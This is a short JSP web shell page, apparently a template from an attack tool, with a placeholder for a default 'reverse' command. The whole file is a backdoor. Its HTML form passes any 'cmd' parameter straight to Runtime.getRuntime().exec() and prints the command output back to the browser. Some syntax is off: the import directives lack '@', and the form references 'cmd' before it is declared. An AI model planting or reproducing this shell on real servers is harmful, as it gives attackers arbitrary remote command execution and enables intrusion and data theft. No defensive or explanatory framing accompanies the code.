<html>
<head>
    <title>Web Shell</title>
</head>
<body>
    <h1>Web Shell</h1>
    <form method=GET action='webshell.jsp'>
    <input name='cmd' type='text' value='<%= cmd %>'>
    <input type=submit value='Run'>
    </form>
<% page import="java.io.*" %>
<% page import="java.util.*" %>
<%
    String reverse_cmd = "{cmd}";
    String cmd = request.getParameter("cmd");
    if (cmd == null || cmd.trim().length() == 0) {
        cmd = reverse_cmd;
    }
    String output = "";
    if (cmd != null) {
        String s = null;
        try {
            Process p = Runtime.getRuntime().exec(cmd);
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            while ((s = br.readLine()) != null) {
                output += s + "<br>";
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

%> 
<pre>
<%=output %>
</pre>   
</body>
</html>

